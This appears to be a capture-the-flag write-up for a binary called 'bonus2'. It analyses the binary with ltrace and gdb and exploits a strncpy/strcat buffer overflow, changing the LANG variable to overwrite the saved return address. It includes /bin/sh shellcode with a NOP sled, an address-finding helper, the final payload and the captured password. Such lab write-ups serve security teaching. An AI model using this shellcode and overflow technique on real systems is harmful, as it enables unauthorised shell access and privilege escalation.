HOW TO FIND THE FLAG:

First let's analyse the binary file bonus2. gdb bonus2 -> info functions

use of memcmp, strcat, getenv, puts, strncpy.

let's record the executon of the program with ltrace -> ltrace ./bonus2 AAAA BBBB

strncpy(0xbffff6e0, "AAAA", 40)                      = 0xbffff6e0
strncpy(0xbffff708, "BBBB", 32)                      = 0xbffff708
getenv("LANG")                                       = "en_US.UTF-8"
memcmp(0xbfffff1f, 0x804873d, 2, 0xb7fff918, 0)      = -1
memcmp(0xbfffff1f, 0x8048740, 2, 0xb7fff918, 0)      = -1
strcat("Hello ", "AAAA")                             = "Hello AAAA"
puts("Hello AAAA"Hello AAAA
)                                   = 11
+++ exited (status 11) +++

The two calls to strncpy have a buffer size of 40 and 32. If the strncpy takes a buffer with a size >= to n and in this case >= to 40 and 32 it won't put the '\0'

Lets observe memory after the call to strcat in the greetuser

b *greetuser+147 and b *greetuser+152

=> r `python -c 'print "A" * 40 + " " + "B" * 32'`

Breakpoint 1, 0x08048517 in greetuser ()
(gdb) x/50x $esp
0xbffff590:	0xbffff5a0	0xbffff5f0	0x00000001	0x00000000
0xbffff5a0:	0x6c6c6548	0x0800206f	0x0000414c	0xb7e5e281
0xbffff5b0:	0xbfffff2d	0xb7e338f8	0x00000002	0xb7ec38ee
0xbffff5c0:	0xbffff5f8	0xbffff640	0x00000000	0xbffff68c
0xbffff5d0:	0xbffff6a8	0xb7ff26b0	0xbfffff2d	0xb7f5d780
0xbffff5e0:	0xbfffff30	0xb7fff918	0xbffff6a8	0x08048630
0xbffff5f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff600:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff610:	0x41414141	0x41414141	0x42424242	0x42424242
0xbffff620:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffff630:	0x42424242	0x42424242	0x00000000	0xb7e5ec73
0xbffff640:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff650:	0x41414141	0x41414141
(gdb) x/s $eax
0xbffff5a0:	 "Hello "

c -> (gdb) x/s $eax
0xbffff5a0:	 "Hello ", 'A' <repeats 40 times>, 'B' <repeats 32 times>

The strcat concatenate greeting and the variable name but because we use strncpy with a buffer size >= to n we have no '\0' and it copies too the variable password.

i f -> Stack level 0, frame at 0xbffff5f0:
 eip = 0x804851c in greetuser; saved eip 0x8004242
 called by frame at 0xbffff5f4
 Arglist at 0xbffff5e8, args: 
 Locals at 0xbffff5e8, Previous frame's sp is 0xbffff5f0
 Saved registers:
  ebp at 0xbffff5e8, eip at 0xbffff5ec
 
-> the eip is partially overwrote with the 'B'. In order to have the eip totally overwrote we are going to the change the LANG environment variable with the netherlander language then the first argument of the strcat will be longer

export LANG=nl then back to gdb bonus2

 r `python -c 'print "A" * 40 + " " + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"'` -> the offset is 23 so the payload will be ./bonus2 `python -c 'print "A" * 40 + " " + "B" * 23 + ADRESS OF SHELLCODE

export SHELLCODE=$(python -c "print '\x90'*40 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")

Now let's find the address of the shellcode with this compiled code : 

#include <stdlib.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
    printf("%s => %p\n", argv[1], getenv(argv[1]));
    return 0;
}

0xbffff8fc -> ./bonus2 `python -c 'print "A" * 40 + " " + "B" * 23 + "\xfc\xf8\xff\xbf"'`

whoami -> bonus3 -> $ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587

